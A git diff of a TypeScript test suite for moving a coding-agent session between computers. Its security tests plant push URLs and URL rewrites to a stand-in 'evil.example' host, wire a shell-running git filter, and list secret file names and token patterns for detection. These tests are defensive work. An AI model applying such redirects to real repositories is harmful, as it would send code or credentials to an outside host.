@@ -1,13 +1,15 @@
 // ADR 0031 §4: moving a session between two of the owner's computers. Two real agents relay through
 // a memory cloud over a real hand-off link; both workspaces are real clones of one bare origin.
 import { execFileSync } from "node:child_process";
-import { mkdtempSync, writeFileSync } from "node:fs";
+import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, renameSync, writeFileSync } from "node:fs";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { afterAll, beforeAll, describe, expect, it, vi } from "vitest";
 import type { AgentLink } from "@chalito/protocol";
+import { openJson } from "@chalito/crypto";
 import { MemoryLinkCloud } from "../src/links/index.js";
-import { TRANSFER_WAIT_MS, Transfers, gitSnapshot } from "../src/links/transfer.js";
+import { TRANSFER_WAIT_MS, Transfers, credArgs, gitSnapshot, riskyUntracked } from "../src/links/transfer.js";
+import { nodeGit, type GitRun } from "../src/coord/coordinator.js";
 import { createLogger } from "../src/redact.js";
 import { codeService } from "../src/code/service.js";
 import { ipcHandlers } from "../src/ipc-handlers.js";
@@ -18,13 +20,31 @@ vi.setConfig({ testTimeout: 30_000 });
 
 const ENV_KEYS = ["GIT_AUTHOR_NAME", "GIT_AUTHOR_EMAIL", "GIT_COMMITTER_NAME", "GIT_COMMITTER_EMAIL"] as const;
 const saved: Record<string, string | undefined> = {};
+// Remotes are ssh://git@github.com/test/<name>.git: an ssh shim serves them from local bare repos and
+// logs each host contacted. The owner's "global" git config is a temp file.
+const GLOBAL = join(mkdtempSync(join(tmpdir(), "rc-gitconfig-")), "config");
+const SSH_ROOT = mkdtempSync(join(tmpdir(), "rc-ssh-"));
+const SSH_LOG = join(SSH_ROOT, "hosts.log");
+const SHIM = join(SSH_ROOT, "ssh-shim.sh");
+const SHIM_ENV = ["GIT_CONFIG_GLOBAL", "GIT_SSH_COMMAND", "GIT_SSH_VARIANT"] as const;
 beforeAll(() => {
+  writeFileSync(GLOBAL, "");
+  mkdirSync(join(SSH_ROOT, "test"));
+  writeFileSync(
+    SHIM,
+    `#!/bin/sh\nhost="$1"; shift\necho "$host" >> "${SSH_LOG}"\ncmd=$(printf %s "$*" | sed "s#'/test/#'${SSH_ROOT}/test/#")\nexec sh -c "$cmd"\n`,
+  );
+  chmodSync(SHIM, 0o755);
+  for (const k of SHIM_ENV) saved[k] = process.env[k];
+  process.env.GIT_CONFIG_GLOBAL = GLOBAL;
+  process.env.GIT_SSH_COMMAND = SHIM;
+  process.env.GIT_SSH_VARIANT = "simple";
   for (const k of ENV_KEYS) saved[k] = process.env[k];
   process.env.GIT_AUTHOR_NAME = process.env.GIT_COMMITTER_NAME = "Test";
   process.env.GIT_AUTHOR_EMAIL = process.env.GIT_COMMITTER_EMAIL = "test@example.invalid";
 });
 afterAll(() => {
-  for (const k of ENV_KEYS)
+  for (const k of [...ENV_KEYS, ...SHIM_ENV])
     if (saved[k] === undefined) delete process.env[k];
     else process.env[k] = saved[k];
 });
@@ -34,7 +54,9 @@ const tmp = (p: string) => mkdtempSync(join(tmpdir(), p));
 
 /** A bare origin with `main` and a pushed `feat/login`, cloned on A and on B. */
 const repos = () => {
-  const origin = tmp("rc-origin-");
+  const name = `r${Math.random().toString(36).slice(2, 10)}`;
+  const origin = join(SSH_ROOT, "test", `${name}.git`);
+  mkdirSync(origin);
   sh(origin, "init", "-q", "--bare", "-b", "main");
   const a = tmp("rc-a-");
   sh(a, "clone", "-q", origin, ".");
@@ -51,10 +73,10 @@ const repos = () => {
   const b = tmp("rc-b-");
   sh(b, "clone", "-q", origin, ".");
   // What each computer reports as its project; nothing fetches in these tests.
-  const url = `https://github.com/test/${origin.split("rc-origin-")[1]}.git`;
+  const url = `ssh://git@github.com/test/${name}.git`;
   sh(a, "remote", "set-url", "origin", url);
   sh(b, "remote", "set-url", "origin", url);
-  return { origin, a, b };
+  return { origin, a, b, url };
 };
 
 const pair = async (o: { aWs?: string; bWs?: string; confirm?: boolean; link?: boolean } = {}) => {
@@ -179,29 +201,95 @@ describe("transfer (ADR 0031 §4)", () => {
     expect(shown).toEqual(["busy", "no_link"]);
   });
 
-  it("refuses uncommitted work and a branch that isn't pushed; Chalito only reads git", async () => {
+  it("saves uncommitted, unpushed or detached work on a new branch; the checkout here is untouched (owner 2026-10-22)", async () => {
     const p = await pair();
+    const a = p.repo!.a;
     const sid = await p.session();
-    writeFileSync(join(p.repo!.a, "wip.ts"), "x\n");
-    const before = sh(p.repo!.a, "status", "--porcelain");
+    writeFileSync(join(a, "wip.ts"), "a medias\n");
+    writeFileSync(join(a, ".gitignore"), "secret.env\n");
+    writeFileSync(join(a, "secret.env"), "TOKEN=x\n");
+    const before = {
+      status: sh(a, "status", "--porcelain"),
+      head: sh(a, "rev-parse", "HEAD"),
+      branches: sh(a, "branch"),
+    };
+    expect((await p.A.command({ type: "session.transfer", sid, toDeviceId: p.B.self.id })).ok).toBe(true);
+    const sent = p.events(p.A, sid)[0] as { stage: string; branch?: string };
+    expect(sent.stage).toBe("sent");
+    expect(sent.branch).toMatch(/^chalito\/move-[0-9a-f]{8}$/);
+    // Here: same status, HEAD, branches; nothing committed on the current branch.
+    expect({
+      status: sh(a, "status", "--porcelain"),
+      head: sh(a, "rev-parse", "HEAD"),
+      branches: sh(a, "branch"),
+    }).toEqual(before);
+    // On origin: the new branch, HEAD as parent, untracked file in, ignored file out.
+    const tip = sh(p.repo!.origin, "rev-parse", `refs/heads/${sent.branch}`);
+    expect(sh(p.repo!.origin, "rev-parse", `${tip}^`)).toBe(before.head);
+    expect(sh(p.repo!.origin, "show", `${tip}:wip.ts`)).toBe("a medias");
+    expect(sh(p.repo!.origin, "ls-tree", "--name-only", tip)).not.toContain("secret.env");
+    expect(sh(p.repo!.origin, "rev-parse", "refs/heads/feat/login")).toBe(before.head);
+    await waitFor(() => p.B.adapter.runs.length === 1);
+    expect(p.B.adapter.runs[0]!.prompts[0]!.text).toContain(
+      `saved for this move on branch ${sent.branch} at commit ${tip}`,
+    );
+  });
+
+  it("saves a commit that isn't pushed, and a detached HEAD, the same way", async () => {
+    const p = await pair();
+    const a = p.repo!.a;
+    const sid = await p.session();
+    writeFileSync(join(a, "more.ts"), "x\n");
+    sh(a, "add", "-A");
+    sh(a, "commit", "-q", "-m", "local only");
+    sh(a, "checkout", "-q", "--detach");
+    expect((await p.A.command({ type: "session.transfer", sid, toDeviceId: p.B.self.id })).ok).toBe(true);
+    const branch = (p.events(p.A, sid)[0] as { branch?: string }).branch!;
+    expect(sh(p.repo!.origin, "rev-parse", `refs/heads/${branch}^`)).toBe(sh(a, "rev-parse", "HEAD"));
+  });
+
+  it("a push that fails is refused with its reason, and the session stays here", async () => {
+    const p = await pair();
+    const a = p.repo!.a;
+    const sid = await p.session();
+    writeFileSync(join(a, "wip.ts"), "x\n");
+    renameSync(p.repo!.origin, `${p.repo!.origin}.gone`);
+    expect(await p.A.command({ type: "session.transfer", sid, toDeviceId: p.B.self.id })).toMatchObject({
+      ok: false,
+      reason: "push_failed",
+    });
+    expect(p.events(p.A, sid).at(-1)).toMatchObject({ stage: "refused", reason: "push_failed" });
+    expect(p.A.core.sessions.has(sid)).toBe(true);
+    expect(p.cloud.queued).toHaveLength(0);
+  });
+
+  it("no filter of the repo runs while saving (attributes from the empty tree)", async () => {
+    const p = await pair();
+    const a = p.repo!.a;
+    const sid = await p.session();
+    const marker = join(tmpdir(), `rc-filter-ran-${Date.now()}`);
+    // The owner's global filter, wired by the repo's .gitattributes: it must not run for a move.
+    execFileSync("git", ["config", "--file", GLOBAL, "filter.mark.clean", `sh -c 'touch ${marker}; cat'`]);
+    writeFileSync(join(a, ".gitattributes"), "*.txt filter=mark\n");
+    writeFileSync(join(a, "notes.txt"), "hola\n");
+    expect((await p.A.command({ type: "session.transfer", sid, toDeviceId: p.B.self.id })).ok).toBe(true);
+    expect(existsSync(marker)).toBe(false);
+    execFileSync("git", ["config", "--file", GLOBAL, "--unset", "filter.mark.clean"]);
+  });
+
+  it("without a remote to save to, unfinished work is refused", async () => {
+    const a = tmp("rc-noremote-a-");
+    sh(a, "init", "-q", "-b", "main");
+    writeFileSync(join(a, "x.ts"), "x\n");
+    sh(a, "add", "-A");
+    sh(a, "commit", "-q", "-m", "x");
+    writeFileSync(join(a, "wip.ts"), "y\n");
+    const p = await pair({ aWs: a, bWs: tmp("rc-noremote-b-") });
+    const sid = await p.session();
     expect(await p.A.command({ type: "session.transfer", sid, toDeviceId: p.B.self.id })).toMatchObject({
       ok: false,
       reason: "transfer_dirty",
     });
-    expect(sh(p.repo!.a, "status", "--porcelain")).toBe(before);
-    sh(p.repo!.a, "add", "-A");
-    sh(p.repo!.a, "commit", "-q", "-m", "wip");
-    expect(await p.A.command({ type: "session.transfer", sid, toDeviceId: p.B.self.id })).toMatchObject({
-      ok: false,
-      reason: "transfer_unpushed",
-    });
-    sh(p.repo!.a, "checkout", "-q", "--detach");
-    expect(await p.A.command({ type: "session.transfer", sid, toDeviceId: p.B.self.id })).toMatchObject({
-      ok: false,
-      reason: "transfer_unpushed",
-    });
-    expect(p.cloud.queued).toHaveLength(0);
-    expect(p.events(p.A, sid).map((e) => (e as { reason?: string }).reason)).toEqual(["dirty", "unpushed", "unpushed"]);
   });
 
   it("refuses a repo whose own config adds a filter (code git status would run)", async () => {
@@ -310,9 +398,11 @@ describe("transfer (ADR 0031 §4)", () => {
     const git = async (_cwd: string, args: string[]) =>
       args.includes("--show-toplevel")
         ? { code: 0, out: "/repo\n", err: "" }
-        : args.includes("config")
-          ? { code: 1, out: "", err: "bad config" }
-          : { code: 0, out: "", err: "" };
+        : args[0] === "version"
+          ? { code: 0, out: "git version 2.45.1\n", err: "" }
+          : args.includes("config")
+            ? { code: 1, out: "", err: "bad config" }
+            : { code: 0, out: "", err: "" };
     expect(await gitSnapshot(git, "/repo")).toEqual({ ok: false, reason: "transfer_dirty" });
   });
 
@@ -390,15 +480,13 @@ describe("transfer (ADR 0031 §4)", () => {
     expect(p.A.links.pending(sid)).toHaveLength(0);
   });
 
-  it("refuses a branch whose upstream isn't origin/<same name> (review)", async () => {
+  it("a branch whose upstream isn't origin/<same name> is saved on a move branch too (review)", async () => {
     const p = await pair();
     const sid = await p.session();
     sh(p.repo!.a, "branch", "-q", "--set-upstream-to=origin/main");
     sh(p.repo!.a, "reset", "-q", "--hard", "origin/main");
-    expect(await p.A.command({ type: "session.transfer", sid, toDeviceId: p.B.self.id })).toMatchObject({
-      ok: false,
-      reason: "transfer_unpushed",
-    });
+    expect((await p.A.command({ type: "session.transfer", sid, toDeviceId: p.B.self.id })).ok).toBe(true);
+    expect((p.events(p.A, sid)[0] as { branch?: string }).branch).toMatch(/^chalito\/move-/);
   });
 
   it("refuses a brief that claims another session (review)", async () => {
@@ -452,6 +540,7 @@ describe("transfer (ADR 0031 §4)", () => {
       event: async (_sid, e) => {
         if (e.stage === "delivered") throw new Error("store down");
       },
+      seal: async (v) => v,
       close: (sid) => void closed.push(sid),
       audit: () => undefined,
       log: createLogger(() => undefined),
@@ -530,5 +619,227 @@ describe("transfer (ADR 0031 §4)", () => {
   it("a git failure other than 'not a repo' is refused, not treated as no repo (review)", async () => {
     const git = async () => ({ code: 128, out: "", err: "fatal: detected dubious ownership in repository" });
     expect(await gitSnapshot(git, "/repo")).toEqual({ ok: false, reason: "transfer_dirty" });
+  });
+  describe("the push of a move can't be redirected (security review)", () => {
+    const hosts = () => (existsSync(SSH_LOG) ? readFileSync(SSH_LOG, "utf8") : "");
+    const dirtyRepo = () => {
+      const r = repos();
+      writeFileSync(join(r.a, "wip.ts"), "x\n");
+      return r;
+    };
+    /** nodeGit, with a session planting `plant` into the repo right after the snapshot. */
+    const planting = (root: string, plant: string[]): GitRun => {
+      const git = nodeGit();
+      return async (cwd, args, env) => {
+        if (args.includes("commit-tree")) execFileSync("git", ["config", ...plant], { cwd: root });
+        return git(cwd, args, env);
+      };
+    };
+
+    it("a push URL planted after the snapshot stops the push", async () => {
+      const r = dirtyRepo();
+      writeFileSync(SSH_LOG, "");
+      const got = await gitSnapshot(
+        planting(r.a, ["remote.origin.pushurl", "ssh://git@evil.example/x.git"]),
+        r.a,
+        "chalito/move-t1",
+      );
+      expect(got).toEqual({ ok: false, reason: "push_failed" });
+      expect(hosts()).not.toContain("evil.example");
+      expect(sh(r.origin, "branch", "--list", "chalito/*")).toBe("");
+    });
+
+    it("a URL rewrite planted after the snapshot stops the push", async () => {
+      const r = dirtyRepo();
+      writeFileSync(SSH_LOG, "");
+      const got = await gitSnapshot(
+        planting(r.a, ["url.ssh://git@evil.example/.pushInsteadOf", "ssh://git@github.com/"]),
+        r.a,
+        "chalito/move-t2",
+      );
+      expect(got).toEqual({ ok: false, reason: "push_failed" });
+      expect(hosts()).not.toContain("evil.example");
+    });
+
+    it("a push URL already in the repo is refused at the snapshot", async () => {
+      const r = dirtyRepo();
+      sh(r.a, "config", "remote.origin.pushurl", "ssh://git@evil.example/x.git");
+      expect(await gitSnapshot(nodeGit(), r.a, "chalito/move-t3")).toEqual({ ok: false, reason: "transfer_dirty" });
+    });
+
+    it("the owner's global rewrites don't apply: it goes to the pinned URL only", async () => {
+      const r = dirtyRepo();
+      writeFileSync(SSH_LOG, "");
+      const key = "url.ssh://git@evil.example/.pushInsteadOf";
+      execFileSync("git", ["config", "--file", GLOBAL, key, "ssh://git@github.com/"]);
+      try {
+        const got = await gitSnapshot(nodeGit(), r.a, "chalito/move-t4");
+        expect(got).toMatchObject({ ok: true, saved: true });
+        expect(hosts().trim().split("\n")).toEqual(["git@github.com"]);
+        expect(sh(r.origin, "branch", "--list", "chalito/*")).toContain("chalito/move-t4");
+      } finally {
+        execFileSync("git", ["config", "--file", GLOBAL, "--unset", key]);
+      }
+    });
+  });
+  describe("re-review (2026-10-22)", () => {
+    it("refuses untracked files that look like secrets or are big, and says which (sealed)", async () => {
+      const p = await pair();
+      const a = p.repo!.a;
+      const sid = await p.session();
+      writeFileSync(join(a, ".env"), "TOKEN=x\n");
+      mkdirSync(join(a, "keys"));
+      writeFileSync(join(a, "keys", "id_ed25519"), "k\n");
+      writeFileSync(join(a, "big.bin"), Buffer.alloc(5 * 1024 * 1024 + 1));
+      writeFileSync(join(a, "fine.ts"), "x\n");
+      expect(await p.A.command({ type: "session.transfer", sid, toDeviceId: p.B.self.id })).toMatchObject({
+        ok: false,
+        reason: "secret_files",
+      });
+      const e = p.events(p.A, sid).at(-1) as unknown as { reason: string; ct: never };
+      expect(e.reason).toBe("secret_files");
+      const opened = await openJson<{ secretFiles: string[] }>(e.ct, p.phone.id, p.phone.box, `event:${sid}`);
+      expect(opened.secretFiles.sort()).toEqual([".env", "big.bin", "keys/id_ed25519"]);
+      expect(sh(p.repo!.origin, "branch", "--list", "chalito/*")).toBe("");
+    });
+
+    it("refuses known secret file names and secrets inside untracked text files (final check)", async () => {
+      const root = mkdtempSync(join(tmpdir(), "rc-risky-"));
+      const files: Record<string, string> = {
+        "my-project-0123456789ab.json": "{}",
+        "client_secret_123.apps.googleusercontent.com.json": "{}",
+        "app-firebase-adminsdk-xyz.json": "{}",
+        ".envrc": "export X=1",
+        "AuthKey_ABC123.p8": "k",
+        "prod.tfvars": "x = 1",
+        "terraform.tfstate.backup": "{}",
+        kubeconfig: "apiVersion: v1",
+        "office.ovpn": "client",
+        "notes.txt": `aws ${"AKIA" + "Q".repeat(16)} here`,
+        "svc.json": '{ "type": "service_account", "private_key": "x" }',
+        "key.txt": "-----BEGIN OPENSSH PRIVATE KEY-----\nabc",
+        "todo.md": "token ghp_abcdefghijklmnopqrstuvwxyz0123456789",
+        "fine.md": "token github_pat_short sk-short xoxb-",
+        "ok.ts": "export const s = 'sk-';",
+        "chat.txt": "xoxb-1234567890-abcdef",
+        "openai.txt": "OPENAI=sk-proj-abcdefghijklmnopqrstuv",
+      };
+      for (const [f, c] of Object.entries(files)) writeFileSync(join(root, f), c);
+      const risky = riskyUntracked(root, Object.keys(files)).sort();
+      expect(risky).toEqual(
+        Object.keys(files)
+          .filter((f) => !["fine.md", "ok.ts"].includes(f))
+          .sort(),
+      );
+    });
+
+    it("sees Git LFS declared in .git/info/attributes too", async () => {
+      const p = await pair();
+      const a = p.repo!.a;
+      const sid = await p.session();
+      writeFileSync(join(a, ".git", "info", "attributes"), "*.psd filter=lfs diff=lfs merge=lfs -text\n");
+      writeFileSync(join(a, "wip.ts"), "x\n");
+      expect(await p.A.command({ type: "session.transfer", sid, toDeviceId: p.B.self.id })).toMatchObject({
+        ok: false,
+        reason: "lfs_files",
+      });
+    });
+
+    it("shows the phone which untracked files a move took (sealed)", async () => {
+      const p = await pair();
+      const sid = await p.session();
+      writeFileSync(join(p.repo!.a, "nuevo.ts"), "x\n");
+      expect((await p.A.command({ type: "session.transfer", sid, toDeviceId: p.B.self.id })).ok).toBe(true);
+      const e = p.events(p.A, sid)[0] as unknown as { ct: never };
+      expect(await openJson(e.ct, p.phone.id, p.phone.box, `event:${sid}`)).toEqual({ untracked: ["nuevo.ts"] });
+    });
+
+    it("refuses a repo with Git LFS files with its own reason", async () => {
+      const p = await pair();
+      const a = p.repo!.a;
+      const sid = await p.session();
+      writeFileSync(join(a, ".gitattributes"), "*.psd filter=lfs diff=lfs merge=lfs -text\n");
+      expect(await p.A.command({ type: "session.transfer", sid, toDeviceId: p.B.self.id })).toMatchObject({
+        ok: false,
+        reason: "lfs_files",
+      });
+    });
+
+    it("a fork setup whose push URL equals the fetch URL still moves", async () => {
+      const p = await pair();
+      const sid = await p.session();
+      sh(p.repo!.a, "config", "remote.origin.pushurl", p.repo!.url);
+      writeFileSync(join(p.repo!.a, "wip.ts"), "x\n");
+      expect((await p.A.command({ type: "session.transfer", sid, toDeviceId: p.B.self.id })).ok).toBe(true);
+    });
+
+    it("git older than 2.40 is refused clearly for a repo, and a plain folder still moves", async () => {
+      const old =
+        (repo: boolean): GitRun =>
+        async (_cwd, args) =>
+          args[0] === "version"
+            ? { code: 0, out: "git version 2.39.5 (Apple Git-154)\n", err: "" }
+            : args.includes("--show-toplevel")
+              ? repo
+                ? { code: 0, out: "/repo\n", err: "" }
+                : { code: 128, out: "", err: "fatal: not a git repository (or any of the parent directories): .git" }
+              : { code: 0, out: "", err: "" };
+      expect(await gitSnapshot(old(true), "/repo", "chalito/move-x")).toEqual({ ok: false, reason: "git_too_old" });
+      expect(await gitSnapshot(old(false), "/plain", "chalito/move-x")).toEqual({ ok: true });
+    });
+
+    it("git runs in the C locale, so its messages match", async () => {
+      const r = await nodeGit()(tmpdir(), ["-c", "alias.e=!env", "e"]);
+      expect(r.out).toMatch(/^LC_ALL=C$/m);
+    });
+
+    it("finds the owner's per-host credential helper (gh auth setup-git form), proxy and CA", async () => {
+      const key = "credential.https://github.com.helper";
+      execFileSync("git", ["config", "--file", GLOBAL, key, "!/usr/bin/gh auth git-credential"]);
+      execFileSync("git", ["config", "--file", GLOBAL, "http.https://github.com.proxy", "http://proxy.local:3128"]);
+      try {
+        const args = await credArgs(nodeGit(), tmpdir(), "https://github.com/o/r.git");
+        expect(args).toContain("credential.https://github.com.helper=!/usr/bin/gh auth git-credential");
+        expect(args).toContain("http.https://github.com.proxy=http://proxy.local:3128");
+        expect(await credArgs(nodeGit(), tmpdir(), "ssh://git@github.com/o/r.git")).toEqual([
+          "-c",
+          "credential.helper=",
+        ]);
+      } finally {
+        execFileSync("git", ["config", "--file", GLOBAL, "--unset", key]);
+        execFileSync("git", ["config", "--file", GLOBAL, "--unset", "http.https://github.com.proxy"]);
+      }
+    });
+
+    it("a hand-off into a session that is moving is refused at once (the sender doesn't wait)", async () => {
+      const p = await pair();
+      const sid = await p.session();
+      const back: Omit<AgentLink, "v" | "createdAt" | "createdBy"> = {
+        ...p.link,
+        id: `lnk_${Math.random().toString(36).slice(2, 14)}`,
+        sender: p.link.receiver,
+        receiver: { ...p.link.sender, sessionId: sid },
+      };
+      expect((await p.A.links.createLocal(back)).ok).toBe(true);
+      expect((await p.B.links.createLocal(back)).ok).toBe(true);
+      p.offline.add(p.B.self.id);
+      expect((await p.A.command({ type: "session.transfer", sid, toDeviceId: p.B.self.id })).ok).toBe(true);
+      const bSid = (
+        await p.B.core.localCommand("local", {
+          type: "session.start",
+          appId: "claude-code",
+          workspaceLabel: "chalito",
+          prompt: "x",
+          permissionMode: "default",
+        })
+      ).sid!;
+      p.B.adapter.run(bSid).emit({ type: "state", state: "idle" });
+      expect((await p.B.links.handoff({ fromSid: bSid, linkId: back.id, text: "haz esto" })).ok).toBe(true);
+      await waitFor(() => p.A.audits.some((x) => x.type === "link.handoff.refused"));
+      expect(p.A.audits.find((x) => x.type === "link.handoff.refused")!.meta).toMatchObject({
+        reason: "receiver_busy",
+      });
+      expect(p.A.adapter.run(sid).prompts).toHaveLength(1);
+    });
   });
 });
